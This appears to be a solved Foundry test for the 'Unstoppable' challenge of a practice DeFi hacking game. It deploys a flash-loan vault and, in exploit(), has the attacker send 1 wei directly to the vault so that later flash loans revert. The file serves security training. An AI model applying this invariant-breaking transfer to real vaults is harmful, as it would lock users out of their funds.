// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../../src/unstoppable/UnstoppableVault.sol";
import "../../src/unstoppable/ReceiverUnstoppable.sol";
import "solmate/tokens/ERC20.sol";

import "../../src/DamnValuableToken.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";
import {stdError} from "forge-std/Test.sol";

contract UnstoppableVaultTest is BaseTest {
    uint256 TOKENS_IN_VAULT = 1000000 ether;
    uint256 INITIAL_ATTACKER_TOKEN_BALANCE = 10 ether;

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiverContract;

    address payable attacker;
    address payable someUser;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "Some User";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];
        someUser = users[1];

        // setup contracts
        token = new DamnValuableToken();
        vault = new UnstoppableVault(ERC20(token), someUser, someUser);

        // setup tokens
        token.approve(address(vault), TOKENS_IN_VAULT);
        token.transfer(address(vault), TOKENS_IN_VAULT);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        vm.startPrank(someUser);
        receiverContract = new ReceiverUnstoppable(address(vault));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }

    function test_ExploitUnstoppableVault() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // it is already broken to this point, because we initialized vault with tokens by sending them directly
        // so tx below would be a solution in hardhat

        // So, I just added mint of 1M of ERC4626 before flashloan and now it's working as expected
        // only additional 1 wei transfer to vault below will break flashloan logic!
        vm.prank(attacker);
        token.transfer(address(vault), 1);
        vm.stopPrank();
    }

    function success() internal override {
        // It is no longer possible to execute flash loans
        vm.expectRevert(0xc52e3eff);
        vm.prank(someUser);
        receiverContract.executeFlashLoan(10);
    }
}
